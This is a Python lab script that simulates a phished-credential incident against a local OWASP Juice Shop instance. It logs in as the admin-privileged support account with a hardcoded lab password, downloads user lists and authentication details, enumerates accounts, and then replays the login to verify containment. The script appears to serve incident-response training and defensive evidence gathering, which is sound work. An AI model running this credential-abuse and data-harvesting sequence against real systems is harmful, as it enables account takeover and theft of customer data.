#!/usr/bin/env python3
"""Phase 4 attack simulation for INC-01 (lab only).

Scenario: an attacker has phished the password of the shared support account
(support@juice-sh.op). In the lab, as at ShopNova (R-01, POL-04 known gap), this
account holds ADMIN rights. The attacker logs in through the normal shop entry
point and downloads customer account data through admin endpoints.

Run from the project root (PowerShell):
    py tools\\phase4_attack.py attack                 # the incident
    py tools\\phase4_attack.py verify-containment     # replay after containment
Target: http://127.0.0.1:3000 only (the lab shop behind the hardening proxy).
The support password is Juice Shop's published lab credential (synthetic).
Output: evidence/phase4/attack/. Standard library only.
"""
import json
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
BASE = "http://127.0.0.1:3000"
OUT = ROOT / "evidence" / "phase4" / "attack"
PHISHED = {"email": "support@juice-sh.op", "password": "J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P"}
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"


def now():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def call(method, path, body=None, token=None):
    req = urllib.request.Request(BASE + path, method=method,
                                 data=json.dumps(body).encode() if body is not None else None,
                                 headers={"Content-Type": "application/json", "User-Agent": UA,
                                          **({"Authorization": f"Bearer {token}"} if token else {})})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def log(entries, step, method, path, status, extra=None):
    e = {"time_utc": now(), "step": step, "request": f"{method} {path}", "http_status": status, **(extra or {})}
    entries.append(e)
    print(f"{e['time_utc']}  {step}: {method} {path} -> {status}")


def mask_email(e):
    user, _, dom = e.partition("@")
    return (user[:2] + "***@" + dom) if dom else "***"


def records(text):
    try:
        d = json.loads(text)
    except ValueError:
        return []
    d = d.get("data", d) if isinstance(d, dict) else d
    return d if isinstance(d, list) else [d] if isinstance(d, dict) else []


def attack():
    OUT.mkdir(parents=True, exist_ok=True)
    entries = []
    s, t = call("POST", "/rest/user/login", PHISHED)
    log(entries, "1 login with phished support credentials", "POST", "/rest/user/login", s)
    if s != 200:
        raise SystemExit("login failed; is the lab running?")
    token = json.loads(t)["authentication"]["token"]
    s, t = call("GET", "/rest/user/whoami", token=token)
    log(entries, "2 check identity", "GET", "/rest/user/whoami", s)
    s, t = call("GET", "/api/Users", token=token)
    users = records(t)
    log(entries, "3 download user list", "GET", "/api/Users", s, {"records": len(users)})
    s, t = call("GET", "/rest/user/authentication-details/", token=token)
    details = records(t)
    log(entries, "4 download authentication details", "GET", "/rest/user/authentication-details/", s,
        {"records": len(details)})
    for u in users:
        s, _ = call("GET", f"/api/Users/{u.get('id')}", token=token)
        log(entries, "5 enumerate single accounts", "GET", f"/api/Users/{u.get('id')}", s)
        time.sleep(0.1)

    pw = [str(d.get("password", "")) for d in details]
    totp = [str(d.get("totpSecret", "")) for d in details]
    summary = {
        "incident": "INC-01",
        "attack_start_utc": entries[0]["time_utc"],
        "attack_end_utc": entries[-1]["time_utc"],
        "requests": len(entries),
        "accounts_exposed": len({u.get("email") for u in users} | {d.get("email") for d in details}),
        "fields_exposed": sorted(set().union(*[set(d.keys()) for d in users + details])) if users or details else [],
        "roles_exposed": sorted({str(u.get("role")) for u in users}),
        "password_field": ("masked by the application (only asterisks)"
                           if pw and all(set(p) <= {"*"} for p in pw) else "NOT masked: hashes exposed"),
        "totp_field": ("masked or empty" if all(set(x) <= {"*"} or x == "" for x in totp) else "NOT masked"),
        "last_login_ip_present": any(u.get("lastLoginIp") for u in users),
        "sample_masked": [mask_email(str(u.get("email", ""))) for u in users[:5]],
        "note": "Synthetic lab data. Full responses are not stored; only this summary.",
    }
    (OUT / "attack-log.json").write_text(json.dumps(entries, indent=2), encoding="utf-8")
    (OUT / "exfiltration-summary.json").write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))


def verify():
    OUT.mkdir(parents=True, exist_ok=True)
    entries = []
    s, t = call("POST", "/rest/user/login", PHISHED)
    log(entries, "replay: login with the phished password", "POST", "/rest/user/login", s)
    token = json.loads(t)["authentication"]["token"] if s == 200 else None
    for path in ("/api/Users", "/rest/user/authentication-details/"):
        s, _ = call("GET", path, token=token)
        log(entries, "replay: admin data endpoint", "GET", path, s)
    contained = all(e["http_status"] in (401, 403) for e in entries)
    result = {"time_utc": now(), "contained": contained, "attempts": entries}
    (OUT / "containment-verification.json").write_text(json.dumps(result, indent=2), encoding="utf-8")
    print("CONTAINED" if contained else "NOT CONTAINED")
    return 0 if contained else 1


if __name__ == "__main__":
    if len(sys.argv) != 2 or sys.argv[1] not in ("attack", "verify-containment"):
        print(__doc__)
        sys.exit(2)
    sys.exit(attack() if sys.argv[1] == "attack" else verify())
